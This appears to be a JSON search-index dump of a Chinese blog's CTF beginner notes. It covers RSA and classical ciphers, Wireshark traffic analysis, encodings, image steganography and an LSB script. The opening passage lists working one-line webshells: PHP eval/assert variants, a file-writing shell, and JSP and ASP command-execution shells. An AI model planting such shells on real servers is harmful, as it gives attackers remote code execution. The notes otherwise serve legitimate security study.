$$d&#x3D;$_GET[&#39;text&#39;]; &#x2F;&#x2F;$data $f&#x3D;&#39;fp&#39;; $$f&#x3D;fopen($_GET[&#39;filename&#39;],&#39;wb&#39;); &#x2F;&#x2F;$fp echo fwrite($fp,$data)?&quot;save success&quot;:&quot;save fail&quot;; fclose($fp); &#125;?&gt; 访问：/word1.php?filename=ggy.php&amp;text=&lt;?%20phpinfo();?&gt;, 在目录下生成ggy.php。访问即可。 preg_replace()1&lt;?php @preg_replace(&quot;&#x2F;abcd&#x2F;e&quot;,$_GET[&#39;a&#39;],&quot;abcdefg&quot;); ?&gt; PHP新版本不支持了。用的是preg_replace_callback() 123456&lt;?php function test()&#123; eval($_GET[&#39;cmd&#39;]);&#125;preg_replace_callback(&quot;&#x2F;abcd&#x2F;&quot;,test,&quot;abcde&quot;); ?&gt; 匹配到就调用test。访问:xxx.php?cmd=phpinfo(); str_replace1234&lt;?php $a &#x3D; str_replace(&quot;b&quot;, &quot;&quot;, &quot;absbsbebrbt&quot;); $a($_GET[&#39;cmd&#39;]);?&gt; pares_str1234&lt;?php $str &#x3D; &quot;a&#x3D;assert&quot;; parse_str($str); $a($_POST[&#39;hacker&#39;]);?&gt; substr_replace1234&lt;?php $a&#x3D;substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4); @$a($_POST[&#39;cmd&#39;]);?&gt; 短木马1&lt;?&#x3D;phpinfo()?&gt; JSP木马1&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;0&quot;));%&gt; ASP木马1&lt;%execute(request(&quot;0&quot;))%&gt; 参考: https://blog.csdn.net/weixin_46270220/article/details/113745113 https://www.cnblogs.com/white-album2/p/9851468.html 涅普的PPT","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"涅普CTF入门-一句话木马","slug":"涅普CTF入门-一句话木马","permalink":"https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"}],"keywords":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}]},{"title":"涅普CTF入门-crypt（二）","slug":"涅普CTF入门-crypt（二）","date":"2021-02-16T03:17:35.000Z","updated":"2021-03-17T13:36:22.642Z","comments":true,"path":"2021/02/16/涅普CTF入门-crypt（二）/","link":"","permalink":"https://ggyggy666.github.io/2021/02/16/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"今天主要学习RSA。","text":"今天主要学习RSA。 简单实现RSA求逆元12from Crypto.Util.number import *d &#x3D; invert(e, (p-1)*(q-1)) 判断素数12from Crypto.Util.number import *print(isPrime(7)) 求最大公因数12from Crypto.Util.number import *print(GCD(12, 18)) &#x2F;&#x2F;6 开n次方根12from gmpy2 import irootprint(iroot(4, 2)) &#x2F;&#x2F;对4开平方根 RSA加密12345678from Crypto.Util.number import *m &#x3D; 123456e &#x3D; 65537p, q &#x3D; getPrime(128), getPrime(128)n &#x3D; p*qc &#x3D; pow(m, e, n)print(c) RSA解密12345678910from Crypto.Util.number import *p &#x3D; q &#x3D; e &#x3D; 65537c &#x3D; d &#x3D; inverse(e, (p-1)*(q-1))n &#x3D; p*qm &#x3D; pow(c, d, n)print(m) 使用RSA通信Alice发送公钥给Bob首先生成两个素数p和q, 相乘得到n, 然后随机生成一个小于n的素数e, 计算出e关于(p-1)*(q-1)的逆元作为密钥d。将(e, n)作为公钥发送给Bob，私钥d自己保留。 12345678from Crypto.Util.number import *e &#x3D; 65537p, q &#x3D; getPrime(128), getPrime(128)n &#x3D; p*qd &#x3D; inverse(e, (p-1)*(q-1))print(&quot;n&#x3D;&quot;, n)print(&quot;d&#x3D;&quot;, d) Bob使用Alice的公钥加密1234567from Crypto.Util.number import *e &#x3D; 65537n &#x3D; m &#x3D; 123456 &#x2F;&#x2F;明文c &#x3D; pow(m, e, n) &#x2F;&#x2F;密文print(&quot;c&#x3D;&quot;, c) Alice使用私钥解密1234567from Crypto.Util.number import *d &#x3D; n &#x3D; c &#x3D; m &#x3D; pow(c, d, n)print(&quot;m&#x3D;&quot;, m) 攻击加密算法第三方窃听通信流程，就只能获取到Alice的公钥(e, n)和Bob发送的密文c。 分解素因数攻击需要知道私钥d, 而d是e关于(p-1)*(q-1)的逆元，因此需要知道φ(n)，也就是得知道n的素因数分解。 在线分解网站： 12https:&#x2F;&#x2F;www.alpertron.com.ar&#x2F;ECM.HTMhttp:&#x2F;&#x2F;www.factordb.com&#x2F;index.php 共模攻击使用了相同的n对相同的明文m进行加密。 已知p+q或p-q或者其它p,q之间的关系。解方程组：$$p*q = n, p+q = a$$使用SageMath解方程组。$$var(‘p q’), solve([p*q==n, p+q==a], [p, q])$$ 小公钥指数攻击e很小，c就可能被枚举出来。存在一个k, 满足：me=c + kn. 如果e=3, 那么：m3 = c + k*n, 枚举k并开根，能够刚好开根的就是解。 已知e, d分解n","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"涅普CTF入门-crypt（二）","slug":"涅普CTF入门-crypt（二）","permalink":"https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/"}],"keywords":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}]},{"title":"涅普CTF入门-crypt（一）","slug":"涅普CTF入门-crypto（一）","date":"2021-02-15T11:09:23.000Z","updated":"2021-03-17T13:36:18.919Z","comments":true,"path":"2021/02/15/涅普CTF入门-crypto（一）/","link":"","permalink":"https://ggyggy666.github.io/2021/02/15/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypto%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"今天开始学习crypt。地址：39.100.234.129","text":"今天开始学习crypt。地址：39.100.234.129 凯撒密码实质就是替代，使用一个密码表，将26个字母偏移一定的顺序一一替代。 加密： 123456789101112131415from string import ascii_uppercasePlaintext &#x3D; &quot;GGY&quot;key &#x3D; 3 &#x2F;&#x2F;偏移3Plaintext &#x3D; Plaintext.upper()Ciphertext &#x3D; &quot;&quot;for i in Plaintext: if i not in ascii_uppercase: Ciphertext +&#x3D; i else: Ciphertext +&#x3D; chr(((ord(i)-ord(&quot;A&quot;)-key) % 26) + ord(&quot;A&quot;))print(Ciphertext)&#x2F;&#x2F;得到密文DDV 解密： 1234567891011121314from string import ascii_uppercaseCiphertext &#x3D; &quot;DDV&quot;Ciphertext &#x3D; Ciphertext.upper()def shift(key): Plaintext &#x3D; &quot;&quot; for i in Ciphertext: if i not in ascii_uppercase: Plaintext +&#x3D; chr(((ord(i)-ord(&quot;A&quot;)-key) % 26) + ord(&quot;A&quot;)) return Plaintextfor key in range(26): print(shift(key)) 由于不知道key是多少，因此需要遍历26个字母。得到 关键词加密选取一个关键词，如果有重复的字母，就去掉。比如success，就得到suces。重复的c和s就去掉了。关键词加密，需要写成两行的形式，第一行是从a到z的正常顺序字母。第二行就是先写给出的关键词，然后将后面填充上字母，规则是：按照第一行的顺序，看到某个字母，看第二行的关键词是否已经有了这个字母，有了就跳过，没有就填充到第二行后面。比如： 密文是：agqr{yue_stdcgciup_padas} 关键词key是：angstromcf 那么可以构建两行： 第一行是a-z, 第二行先写关键词。后面填充，a已经出现了，轮到b,没有就填充，轮到c, 已经存在了，轮到d， 没有就填充……由此得到密码表。 根据密码表一一对应得到flag。 仿射加密加密： p是明文，c是密文。a与26互素。解密则是： 需要算出a的逆元。可以用python： 123from gmpy2 import invertprint(invert(5, 26))&#x2F;&#x2F;求5关于26的逆元 加密： 解密： 单表代替爆破的话有26！，太大了难以爆破。需要一些解密手段。比如密文的字母频率，然后与已知的字母频率表对应从而可以得到密码表。 快速破解单表代替密码网站：http://quipqiup.com/ 维吉尼亚加密多表代替，本质是多个凯撒加密。 明文是：ATTACKKATDAWN 关键词是：LEMON, 可以发现关键词的长度比明文短，此时可以重复关键词，得到：LEMONLEMONLE 然后查表： 可以看出这个表是从A-Z的字母表，每一行每一列都是从对应的字母开始的。加密过程：第一个字母是A，对应关键词第一个字母是L，那么就查看A列L行，得到L，以此类推。最终得到密文：LXFOPVEFRNHR。 解密过程：查看密文第一个字母是L，对应关键词第一个字母是L，那么先查看L行，在L行中找到L，对应的列是A，即可得到明文A。 可以避免字母频率分析攻击，但是有缺点：一个字符在明文中重复，密钥对应部分也相同，得到的密文部分也是重复的。 替换和编码进制转换 字符串和字节类型转换 base64编码解码 整形和字节类型转换","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"涅普CTF入门-crypt（一）","slug":"涅普CTF入门-crypt（一）","permalink":"https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%B8%80%EF%BC%89/"}],"keywords":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}]},{"title":"涅普CTF入门-misc（三）","slug":"涅普CTF入门-misc（三）","date":"2021-02-09T10:51:56.000Z","updated":"2021-03-17T13:36:05.484Z","comments":true,"path":"2021/02/09/涅普CTF入门-misc（三）/","link":"","permalink":"https://ggyggy666.github.io/2021/02/09/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"今天学习第三课——流量分析。","text":"今天学习第三课——流量分析。 互联网五层模型应用层——传输层——网络层——链路层——物理层。 WireShark的基本使用 首先打开Wireshark，会查找本地接口。 ​ 选择WLAN点击，就能收到一堆流量包。 访问一个http网站：http://zj.gsxt.gov.cn/，可以发现导航栏中会显示不安全。在Wireshark中，过滤器那栏输入http，表示只显示http请求的流量包。 查看text/html的包，这就是返回包。 访问一个https网站：https://etax.zhejiang.chinatax.gov.cn/，导航栏显示一把锁。那么http和https有什么区别呢？Wireshark过滤器输入：http and http.request.uri contain “index.html”, 再去访问一遍https网站，发现没有index.html访问路径的流量包，访问http网站，显示了流量包。（过滤器是http的当然没有https的咯。。） 查看https的需要输入tls, 显示出来的是加密过的东西。 导出对象，过滤器输入http，停止捕获，点击文件——导出对象——选择http，之后保存就可以了。或者选定一个TCP数据包，右键点击追踪流，选择TCP流，之后弹出的框中选择原始数据，另存为文件。使用010打开即可。 保存整个流量，结尾是pcapng。 终端互相通信两台电脑直接相连 给PC0和PC1分配各自的静态IP，然后在PC0的终端中去pingPC1。 直接ping通了。 多台电脑相连两台相同的电脑相连，只需要一条虚线连接。但是多台电脑相连就不行了，因为电脑那里端口有限，如果每连接一个终端就需要增加一个端口，这显然不可能。因此需要一个中介。 集线器电脑与集线器相连，由于是不同设备，就需要直实线了。给新增的PC2配置IP：192.168.1.102，在PC0上ping一下： 但是集线器有一个缺点。PC0向另一个PC发送消息时集线器是向其他所有PC发送的，如果这时有一个黑客连进来了，就会监听到，很不安全。 交换机与集线器类似，都是实线连接。 交换机就比较安全了。因为两个终端通信时，不仅需要IP，还需要一个MAC地址。交换机根据MAC地址发送到对应的目的端口，这样就不会发送给其它人了。而IP-MAC地址表就是ARP表。如果想要发送给多个人，就可以将目的MAC地址修改成00即广播地址。ARP表中没有IP对应的目的MAC地址，需要启动ARP寻址。 三次握手：SYN——SYN，ACK——ACK CTF题目上课认真听了吗题目显示是三种流量中查找flag。直接按照师傅说的方法来。 下载附件打开，点击查找那个图标。选择“分组字节流”，“字符串”，查找flag{ 不停点击右边的查找就能找到几个flag了，拼接即可。 我是间谍 下载附件imaspy.exe, Wireshark抓包WLAN，然后运行exe文件，即可捕获到流量。 按照上面的方法查找flag{即可拿到flag。 简单流量 下载附件，打开流量包后，Wireshark中导入SSL密钥：编辑——首选项——Protocol中选择TLS，然后导入sslkey.log 还是搜索字符串，但是要注意，必须是字符分组而不是字符字节流了。 找到之后，将其URL解码就行了。 监听消息 下载附件，打开，使用Wireshark打开流量包。 尝试搜索flag无果。右键追踪流，发现一堆十六进制的字符。 将这些字符串复制到010中，发现是PNG格式的 但是使用PNG模板时报错了，另存为PNG图片也不乏显示。应该是校验和不对，也就是图片的宽高不对导致校验和不对。因此使用脚本爆破高。 12345678910111213141516import osimport binasciiimport structmisc &#x3D; open(&quot;listen.png&quot;,&quot;rb&quot;).read()#print(misc[0x0c:0x0f+1])# 爆破高crc32_bytes &#x3D; misc[0x1d:0x20+1]# 读出bytescrc32_hex_eval &#x3D; eval(&#39;0x&#39; + crc32_bytes.hex())#bytes串 -&gt; hex串 -&gt; 值print(crc32_hex_eval)for i in range(4096): data &#x3D; misc[0x0c:0x0f+1] + misc[0x10:0x13+1] + struct.pack(&#39;&gt;i&#39;,i)+ misc[0x18:0x1c+1] #IHDR数据 crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff if crc32 &#x3D;&#x3D; crc32_hex_eval : #IHDR块的crc32值 print(i) print(&quot;height_hex:&quot;+ hex(i)) 最终得到高是100，十六进制就是64，因此010中修改高为64. 保存成xxx.png之后，打开文件，发现是一张残缺的二维码。 打开网站：https://merricx.github.io/qrazybox/，点击页面的Editor Mode 将右上角的框框截下来保存成code.png。 打开PS，新建文件，加载进来这两张图片(xxx.png和code.png)，按照大小组装好 扫一扫即可。","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"涅普CTF入门-misc（三）","slug":"涅普CTF入门-misc（三）","permalink":"https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/"}],"keywords":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}]},{"title":"涅普CTF入门-misc（二）","slug":"涅普CTF入门-misc（二）","date":"2021-02-03T07:57:18.000Z","updated":"2021-03-17T13:36:09.880Z","comments":true,"path":"2021/02/03/涅普CTF入门-misc（二）/","link":"","permalink":"https://ggyggy666.github.io/2021/02/03/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"今天继续学习misc, 主要是各种编码。 各种编码集合的文章：https://blog.csdn.net/dyw_666666/article/details/89973048","text":"今天继续学习misc, 主要是各种编码。 各种编码集合的文章：https://blog.csdn.net/dyw_666666/article/details/89973048 常见进制二进制二进制转ASCII码 01101110 01100101 01110000 对应的ASCII码：nep 二进制转Morse码 二进制先转成ASCII码，得到.或者-, 就可以组合成Morse码 还可以直接使用CyberChef。 二进制转成二维码 将二进制字符串放到str中。然后根据这个字符串长度进行开方，放到MAX中。比如上图，625个数字，开方得到25，因此MAX=25. 二进制转hex十六进制 下载bin.txt, 写一个python脚本 123with open(&quot;bin.txt&quot;, &#39;r&#39;) as f: for line in f.readlines(): print(hex(int(line, 2))) 就可以得到十六进制的字符串。 复制字符串，打开010，新建一个文件，选择hex, 然后使用Ctrl+Shift+V粘贴（必须要shift！），之后按F5，模板选择JPG，run，然后另存为图片bin.jfif 常见编码 base编码base64: 把3个8位的字节转化为4个6位的字节，之后在每6位字节前加上2个0，构成4个8位的。=是填充字符。 base32：使用32个字符（A-Z和2-7）。末尾最多6个= base16：使用0-9和A-F。不会出现=。 base36: 0-9和26个字母，不区分大小写。要么全大写，要么全小写。加密仅支持数字，解密仅支持字符串。 base58：数字和字母，去掉了0和O，I和l（大写i和小写l）。58个 base62: 26个字母大小写和0-9 base91、base92等 base64还原成图片将base64.txt里的东西复制下来，然后访问：http://tool.chinaz.com/tools/imgtobase/, 粘贴，还原即可得到一个二维码。扫一扫就能得到图片。 base编码转换密文： 1LJWXQ2C2GN2EGTSIJZWFQ6SGPJMHUTTIMMZWW2DGKE6T2&#x3D;&#x3D;&#x3D; 打开网站：https://www.qtool.net/baseencode 将密文复制进去，先使用base32解码，得到： 1ZmxhZ3tCNHNlXzFzXzNhc3khfQ&#x3D;&#x3D; 然后使用base64解码得到： 1flag&#123;B4se_1s_3asy!&#125; Morse编码 https://www.bejson.com/enc/morse/ 敲击码 二维码 补二维码可以用qrazybox https://github.com/Merricx/qrazybox 多张图片合成一张二维码可以使用PS：新建一个画布，将图片一个个拖进来。 Unicode编码密文： 1\\u66\\u6c\\u61\\u67\\u7b\\u57\\u33\\u6c\\u63\\u30\\u6d\\u65\\u21\\u7d 这是Unicode编码，\\u后面的数字是ASCII码，是十六进制的，转换成十进制后对照ASCII码表即可得到flag。 encode明文都是：alert(1) aaencode: http://www.atoolbox.net/Tool.php?Id=703 JS代码转成常用的网络表情，即颜文字js加密。 jjencode: http://www.atoolbox.net/Tool.php?Id=704 uuencode: http://www.atoolbox.net/Tool.php?Id=731 jsfuck: 只有6个字符。https://www.sojson.com/jsfuck.html brainfuck 和 okk：https://www.splitbrain.org/services/ook zip伪加密参考这篇文章：https://www.cnblogs.com/xishaonian/p/7713657.html 将压缩文件zip1.zip下载下来，使用bandzip打开，发现里面有个flag.txt, 但是解压打开提示需要密码。将整个zip1.zip拖到010中打开。 将09修改为00，保存后，解压打开flag.txt即可。 古怪的编码社会主义核心价值观http://www.atoolbox.net/Tool.php?Id=850 与佛论禅http://www.keyfc.net/bbs/tools/tudoucode.aspx 熊曰http://hi.pcmoe.net/","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"涅普CTF入门-misc（二）","slug":"涅普CTF入门-misc（二）","permalink":"https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%BA%8C%EF%BC%89/"}],"keywords":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}]},{"title":"涅普CTF入门-misc（一）","slug":"涅普CTF入门-misc","date":"2021-02-02T12:58:19.000Z","updated":"2021-03-17T13:36:14.809Z","comments":true,"path":"2021/02/02/涅普CTF入门-misc/","link":"","permalink":"https://ggyggy666.github.io/2021/02/02/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc/","excerpt":"之前报名了涅普高校计划，白嫖了一个零组的邀请码。昨天开始讲课，在此总结一下。","text":"之前报名了涅普高校计划，白嫖了一个零组的邀请码。昨天开始讲课，在此总结一下。 MISC简介miscellaneous。主要类型： 数据编码/图形密码 图片隐写 音频&amp;视频隐写 流量分析 内存取证 游戏隐写 010-Editor的使用界面 打开一张图片后，可以看到转成16进制后的图片内容，下方是模板，将图片内容分成一块块的，可以用alt+4显示模板。可以在十六进制内容中进行增加修改操作。软件右下角点击即可切换增加或者修改模式。 新生成文件 点击左上角的New新建一个文件 在新文件中点击选择十六进制。 在原来图片文件使用Ctrl+A选择全部内容，复制，在新文件中Ctrl+shift+V粘贴。 此时还不是图片文件。按下F5，弹出的框中选择图片后缀，点击Run。 查找高度 右键图片，点击属性，查看它的分辨率。 将分辨率第一个值转换成十六进制。 在模板中，Ctrl+F搜索那个十六进制值即可。 常见格式文件头JPEG：FFD8FF PNG：89504E47 GIF：474946383961 TIFF：49492A00 bmp: 424D CAD: 41433130 psd: 38425053 rtf: 7B5C727466 xml: 3C3F786D6C 图片隐写分类 右击属性：直接右键图片，查看详细信息。 文件末尾藏有字符串 文件包含 修改文件头：破坏文件头，图片一定不能显示；破坏文件尾，图片可能可以显示。 GIF png(bmp) JPG 双图隐写 stegpy silenteye 文件藏有字符串使用010打开图片，查看末尾隐藏的字符串。但如果不是末尾，很难肉眼找到。因此需要使用kali的工具（strings、grep、）。 命令：strings strings.jpg 命令：grep -a &quot;BJD&quot; grep.jpeg 其中BJD是要匹配的字符串。 命令：file gg 当一个文件没有后缀名时，可以使用file 文件名来查看文件类型。 两个图片合在一个图片使用binwalk来辨别。binwalk xxx.jpg 可以看到识别出了有两张图片。使用binwalk -e xxx.jpg, 会生成一个文件夹。 使用foremost xxx.jpg, 需要先安装foremost：apt install foremost 生成一个output文件夹，里面就是分离出来的两张图片。 GIF图片隐写 将GIF图片放到PS中打开，看图层得flag。 使用Stegsolve工具打开gif图片。 打开图片后，先按Analyse，选择Frame Browser。弹框，然后点击箭头下一帧直到看到flag。 使用Ulead GIF工具打开GIF图片，查看时间间隔，即每帧之间的间隔。比如是：0.1s, 0.2s, 0.1s, 0.2s….有可能这些间隔有猫腻。如果0.1s是0，0.2s是1，得到：0101…二进制数字。 有些帧是重叠的无法看清，需要使用工具：Namo_GIF。 pngIHDR、zlib首先是打开CTF题目，发现图片无法显示，很可能是CRC校验和出错了。使用脚本来下载图片： 12345678910111213import requestsimport io,syssys.stdout &#x3D; io.TextIOWrapper(sys.stdout.buffer,encoding&#x3D;&#39;utf-8&#39;) #控制输出的编码，可以不要response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;stega&#x2F;IHDR.png&#39;) cat_img &#x3D; str(response.text).encode(&#39;utf-8&#39;)#出现bytes错误，TypeError: a bytes-like object is required, not &#39;str&#39;#str通过encode()方法可以编码为指定的bytesprint(cat_img) with open(&#39;ihdr1.png&#39;,&#39;wb&#39;) as f: f.write(cat_img) f.close() 下载之后保存成了ihdr1.png。 使用010打开png图片，查看IHDR位置，得到宽和高。 可以修改高得到图片下面的东西。但是有些题目可能必须要修改成某个特定值才能显示，就需要爆破。脚本如下： 12345678910111213141516import osimport binasciiimport structmisc &#x3D; open(&quot;IHDR.png&quot;,&quot;rb&quot;).read()#print(misc[0x0c:0x0f+1])# 爆破高crc32_bytes &#x3D; misc[0x1d:0x20+1]# 读出bytescrc32_hex_eval &#x3D; eval(&#39;0x&#39; + crc32_bytes.hex())#bytes串 -&gt; hex串 -&gt; 值print(crc32_hex_eval)for i in range(4096): data &#x3D; misc[0x0c:0x0f+1] + misc[0x10:0x13+1] + struct.pack(&#39;&gt;i&#39;,i)+ misc[0x18:0x1c+1] #IHDR数据 crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff if crc32 &#x3D;&#x3D; crc32_hex_eval : #IHDR块的crc32值 print(i) print(&quot;height_hex:&quot;+ hex(i)) 得到高度是819. 于是在010中修改高度为819，另存为一个png图片。注意不要直接保存，不然它还是没有修改的。之后就能直接双击打开图片了。 IDAT判断是否存在隐写： IDAT块都是填充满了才会填充下一块。而如果看到没有填充满就有下一块了，就说明可能存在隐写。使用pngcheck即可判断。 .\\pngcheck-2.3.0-win32\\pngcheck.exe -v ..\\..\\..\\涅普高校人才培养计划-第一课\\png\\pngcheck.png 可以看到每个IDAT块大小不一，判断存在隐写。使用010打开。 先点击模板最后一个，可以看到IDAT块的结尾已经被标注了。下一个块开头就是78 9C。然后复制下块的内容 注意，不要把后面结尾的也复制了，而且复制需要使用Ctrl+Shift+C。复制到脚本中，运行即可 成功获取flag。 但是这个还有更简单的方法。使用上面的binwalk -e pngcheck.png, 会输出一个文件，直接打开就能看到flag。 lsb隐写、lsb加密lsb是最低有效位。 StegSolve使用StegSolve打开图片。点击Analyse，Data Extract，然后点击下方图片箭头所指位置（不过可能有些只需要勾选Red或者其它某种颜色的），最后点击Preview。（可以看看链接：https://cnblogs.com/cat47/p/11483478.html) 拖到最上方，可以看到一个PNG，说明这张图片里面还隐藏了一个PNG图片。可以点击Save Bin 保存图片，由于已经知道了是png图片，因此保存成222.png。 得到一张二维码图片。使用QQ扫一扫即可。 还有一道题。还是像上面那样操作，得到文件头是PK 然后保存成zip格式的文件。直接双击打开会出现文件已损坏，不过随后出现一个1文件。解压后，将1文件使用010打开，寻找flag即可。 zsteg它在kali上。直接一条命令：zsteg xxx.png, 可以看到隐藏的图片类型。如果没有，加上-a，即：zsteg -a xxx.png。 zsteg -e 图片类型所在通道 图片名称 &gt; 123.png 就可以将那个隐藏的png输出到123.png。 注意，kali没有安装这个工具，自行百度安装。 lsb.py可以在工具集中找到。使用方法： 1python lsb.py extract 1.png 1.txt 123456 使用python2。extract意思是提取。1.png是图片名，1.txt是导出的文件名，123456是密码。 lsb.py: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198import sysimport structimport numpyimport matplotlib.pyplot as pltfrom PIL import Imagefrom crypt import AESCipher# Decompose a binary file into an array of bitsdef decompose(data): v &#x3D; [] # Pack file len in 4 bytes fSize &#x3D; len(data) bytes &#x3D; [ord(b) for b in struct.pack(&quot;i&quot;, fSize)] bytes +&#x3D; [ord(b) for b in data] for b in bytes: for i in range(7, -1, -1): v.append((b &gt;&gt; i) &amp; 0x1) return v# Assemble an array of bits into a binary filedef assemble(v): bytes &#x3D; &quot;&quot; length &#x3D; len(v) for idx in range(0, len(v)&#x2F;8): byte &#x3D; 0 for i in range(0, 8): if (idx*8+i &lt; length): byte &#x3D; (byte&lt;&lt;1) + v[idx*8+i] bytes &#x3D; bytes + chr(byte) payload_size &#x3D; struct.unpack(&quot;i&quot;, bytes[:4])[0] return bytes[4: payload_size + 4]# Set the i-th bit of v to xdef set_bit(n, i, x): mask &#x3D; 1 &lt;&lt; i n &amp;&#x3D; ~mask if x: n |&#x3D; mask return n# Embed payload file into LSB bits of an imagedef embed(imgFile, payload, password): # Process source image img &#x3D; Image.open(imgFile) (width, height) &#x3D; img.size conv &#x3D; img.convert(&quot;RGBA&quot;).getdata() print &quot;[*] Input image size: %dx%d pixels.&quot; % (width, height) max_size &#x3D; width*height*3.0&#x2F;8&#x2F;1024 # max payload size print &quot;[*] Usable payload size: %.2f KB.&quot; % (max_size) f &#x3D; open(payload, &quot;rb&quot;) data &#x3D; f.read() f.close() print &quot;[+] Payload size: %.3f KB &quot; % (len(data)&#x2F;1024.0) # Encypt cipher &#x3D; AESCipher(password) data_enc &#x3D; cipher.encrypt(data) # Process data from payload file v &#x3D; decompose(data_enc) # Add until multiple of 3 while(len(v)%3): v.append(0) payload_size &#x3D; len(v)&#x2F;8&#x2F;1024.0 print &quot;[+] Encrypted payload size: %.3f KB &quot; % (payload_size) if (payload_size &gt; max_size - 4): print &quot;[-] Cannot embed. File too large&quot; sys.exit() # Create output image steg_img &#x3D; Image.new(&#39;RGBA&#39;,(width, height)) data_img &#x3D; steg_img.getdata() idx &#x3D; 0 for h in range(height): for w in range(width): (r, g, b, a) &#x3D; conv.getpixel((w, h)) if idx &lt; len(v): r &#x3D; set_bit(r, 0, v[idx]) g &#x3D; set_bit(g, 0, v[idx+1]) b &#x3D; set_bit(b, 0, v[idx+2]) data_img.putpixel((w,h), (r, g, b, a)) idx &#x3D; idx + 3 steg_img.save(imgFile + &quot;-stego.png&quot;, &quot;PNG&quot;) print &quot;[+] %s embedded successfully!&quot; % payload# Extract data embedded into LSB of the input filedef extract(in_file, out_file, password): # Process source image img &#x3D; Image.open(in_file) (width, height) &#x3D; img.size conv &#x3D; img.convert(&quot;RGBA&quot;).getdata() print &quot;[+] Image size: %dx%d pixels.&quot; % (width, height) # Extract LSBs v &#x3D; [] for h in range(height): for w in range(width): (r, g, b, a) &#x3D; conv.getpixel((w, h)) v.append(r &amp; 1) v.append(g &amp; 1) v.append(b &amp; 1) data_out &#x3D; assemble(v) # Decrypt cipher &#x3D; AESCipher(password) data_dec &#x3D; cipher.decrypt(data_out) # Write decrypted data out_f &#x3D; open(out_file, &quot;wb&quot;) out_f.write(data_dec) out_f.close() print &quot;[+] Written extracted data to %s.&quot; % out_file# Statistical analysis of an image to detect LSB steganographydef analyse(in_file): &#39;&#39;&#39; - Split the image into blocks. - Compute the average value of the LSBs for each block. - The plot of the averages should be around 0.5 for zones that contain hidden encrypted messages (random data). &#39;&#39;&#39; BS &#x3D; 100 # Block size img &#x3D; Image.open(in_file) (width, height) &#x3D; img.size print &quot;[+] Image size: %dx%d pixels.&quot; % (width, height) conv &#x3D; img.convert(&quot;RGBA&quot;).getdata() # Extract LSBs vr &#x3D; [] # Red LSBs vg &#x3D; [] # Green LSBs vb &#x3D; [] # LSBs for h in range(height): for w in range(width): (r, g, b, a) &#x3D; conv.getpixel((w, h)) vr.append(r &amp; 1) vg.append(g &amp; 1) vb.append(b &amp; 1) # Average colours&#39; LSB per each block avgR &#x3D; [] avgG &#x3D; [] avgB &#x3D; [] for i in range(0, len(vr), BS): avgR.append(numpy.mean(vr[i:i + BS])) avgG.append(numpy.mean(vg[i:i + BS])) avgB.append(numpy.mean(vb[i:i + BS])) # Nice plot numBlocks &#x3D; len(avgR) blocks &#x3D; [i for i in range(0, numBlocks)] plt.axis([0, len(avgR), 0, 1]) plt.ylabel(&#39;Average LSB per block&#39;) plt.xlabel(&#39;Block number&#39;)# plt.plot(blocks, avgR, &#39;r.&#39;)# plt.plot(blocks, avgG, &#39;g&#39;) plt.plot(blocks, avgB, &#39;bo&#39;) plt.show()def usage(progName): print &quot;LSB steganogprahy. Hide files within least significant bits of images.\\n&quot; print &quot;Usage:&quot; print &quot; %s hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;&quot; % progName print &quot; %s extract &lt;stego_file&gt; &lt;out_file&gt; 